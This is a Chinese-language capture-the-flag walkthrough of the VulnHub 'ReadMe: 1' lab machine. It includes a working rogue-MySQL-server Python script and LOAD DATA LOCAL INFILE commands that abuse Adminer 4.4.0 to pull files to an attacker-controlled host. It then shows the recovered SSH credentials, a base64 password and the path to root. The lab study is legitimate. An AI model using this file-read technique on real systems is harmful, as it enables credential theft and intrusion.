# ReadMe: 1

2025.02.22 https://www.vulnhub.com/entry/readme-1,336/

## Ip

192.168.5.40

## Scan

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
```

web 扫描发现 http://192.168.5.40/info.php 是 phpinfo 页面，mysql 版本 mysqlnd 5.0.12-dev ，仔细看一下 info.php 中 mysql 的配置信息，发现 mysqli.allow_local_infile = on 这里就可以加载客户端所在系统的文件到数据库，同时 open_basedir 没有设置。

发现另外一个页面 http://192.168.5.40/adminer.php 是个数据库管理页面，同时发现版本是 4.4.0 。这里就可以结合上面的配置，读取运行 adminer 网页的系统上的文件，前提是只要这个 adminer 能够连接远程的 mysql 服务就可以，adminer 默认开启远程连接。在 adminer 的后续高版本上已经修复了这个本地读取的漏洞。

发现 http://192.168.5.40/reminder.php 里面说密码在 txt 文件中，然后下面是一个搜索 username 的搜索框，输入单引号报错，存在 sql 注入，直接使用 sqlmap 跑，但是没发现信息，查看源码，发现图片的路径有提示：

```
that-place-where-i-put-that-thing-that-time/565b0f4691fe5
```

发现了目录的名字 that-place-where-i-put-that-thing-that-time，打开这个目录链接 http://192.168.5.40/that-place-where-i-put-that-thing-that-time/ 发现 creds.txt：

```
creds.txt -> /etc/julian.txt
```

这里需要读取到这个 /etc/julian.txt 文件。

可以利用 adminer 远程连接我们自己搭建的 mysql，然后利用 load local data 读取到目标机器上的 /etc/julian.txt 文件到我们自己搭建的数据库。

在 kali 上授权远程数据库连接，创建 test 数据库和 test 表用于接收数据：

```
grant all privileges on *.* to 'root'@'%' identified by 'mysql';

create database test;
use test;
create table test(name varchar(500));

SET GLOBAL local_infile = true;
SHOW GLOBAL VARIABLES LIKE 'local_infile';  # 要保证自己搭建的mysql开启这个参数
+---------------+-------+
| Variable_name | Value |
+---------------+-------+
| local_infile  | ON    |
+---------------+-------+
```

在 adminer.php 上连接我们自己 kali 上的数据库(这里服务器地址填 kali 的 ip 地址)，在 adminer 中执行下面语句导入本地文件：

```
load data local infile '/etc/julian.txt' into table test;    # 读取mysql客户端也就是运行adminer.php的机器上的本地文件到数据库。不加local是读取mysql服务器的文件，添加local参数为读取client本地文件。
```

这时在读取这个表就能看到 julian 的 ssh 连接密码：

```
select * from test;
+-----------------------------------------------------------------------------+
| name                                                                        |
+-----------------------------------------------------------------------------+
| U: julian                                                                   |
| P: I_mean...WhoThoughtLettingTheMySQLClientTransmitFilesWasAGoodIdea?Sheesh |  <-- ssh的连接密码
+-----------------------------------------------------------------------------+
```

或者自己用 python 搭建一个 mysql 的模拟服务端，也可以读取文件：

```
import socket
import logging
import sys
logging.basicConfig(level=logging.DEBUG)

filename=sys.argv[1]
sv=socket.socket()
sv.setsockopt(1,2,1)
sv.bind(("",33060))
sv.listen(5)
conn,address=sv.accept()
logging.info('Conn from: %r', address)
conn.sendall("\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00")
conn.recv(9999)
logging.info("auth okay")
conn.sendall("\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00")
conn.recv(9999)
logging.info("want file...")
wantfile=chr(len(filename)+1)+"\x00\x00\x01\xFB"+filename
conn.sendall(wantfile)
content=conn.recv(9999)
logging.info(content)
conn.close()
```

使用 python2 运行上述脚本，然后在 adminer.php 上进行连接，server 输入 192.168.5.3:33060 , 用户名和密码随意输，直接点 login

```
python2 exp.py '/etc/julian.txt'

INFO:root:Conn from: ('192.168.5.40', 43350)
INFO:root:auth okay
INFO:root:want file...
INFO:root:VU: julian
P: I_mean...WhoThoughtLettingTheMySQLClientTransmitFilesWasAGoodIdea?Sheesh
```

这里有这个漏洞的详细解析：https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/Adminer/Adminer%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/

登陆后拿到了 user flag：

```
julian@readme:~$ cat  user.txt
2e640cbe2ea53070a0dbd3e5104e7c98
```

julian 没有 sudo 权限，同时其他 suid 和 crontab 等都没有利用路径。

这里在另外一个用户 /home/tatham 中发现了 payload.bin 和 poc.c ，根据文件命名，像是提权提示。需要得到 payload.bin 中的 shellcode 信息，将 payload 中的二进制代码复制到 poc.c 中进行编译，并且做了一些汇编代码修复。

最终得到了该用户的登陆密码：

```
U28uLi5Zb3VGaWd1cmVkT3V0SG93VG9SZWNvdmVyVGhpc0h1aD9HR1dQbm9SRQ==
```

对上面进行 base64 解码得到密码：

```
So...YouFiguredOutHowToRecoverThisHuh?GGWPnoRE
```

切换到 tatham 后，sudo -l 发现是 ALL 可以直接提权到 root：

```
root@readme:~# cat root.txt
52eeb6cfa53008c6b87a6c79f4347275
```
